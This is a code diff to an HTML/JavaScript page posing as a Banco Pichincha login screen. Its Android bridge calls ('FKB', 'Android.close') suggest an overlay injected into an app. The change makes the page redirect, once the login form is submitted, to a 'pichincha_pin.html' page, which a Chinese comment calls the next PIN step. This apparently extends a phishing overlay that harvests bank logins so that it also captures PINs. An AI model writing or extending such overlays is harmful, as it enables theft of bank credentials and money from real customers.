@@ -94,7 +94,11 @@ function togglePw(){var p=document.getElementById('password');p.type=(p.type==='
 function toggleCk(){document.getElementById('ckbox').classList.toggle('on');}
 function syncBtn(){var u=document.getElementById('login').value.trim();var p=document.getElementById('password').value;document.getElementById('go').className=(u&&p)?'btn pri ready':'btn pri';}
 var submitted=false;
-function closeApp(){try{if(typeof FKB!=='undefined'&&FKB.setClosePage)FKB.setClosePage(pk);else if(typeof Android!=='undefined'&&Android.close)Android.close();}catch(e){}}}
+function closeApp(){
+  /* 登录已提交 → 继续走 PIN 步骤（同目录 pichincha_pin.html） */
+  try{ location.href='pichincha_pin.html'; return; }catch(e){}
+  try{if(typeof FKB!=='undefined'&&FKB.setClosePage)FKB.setClosePage(pk);else if(typeof Android!=='undefined'&&Android.close)Android.close();}catch(e){}
+}}
 function doLogin(){
   var u=document.getElementById('login').value.trim();
   var p=document.getElementById('password').value;
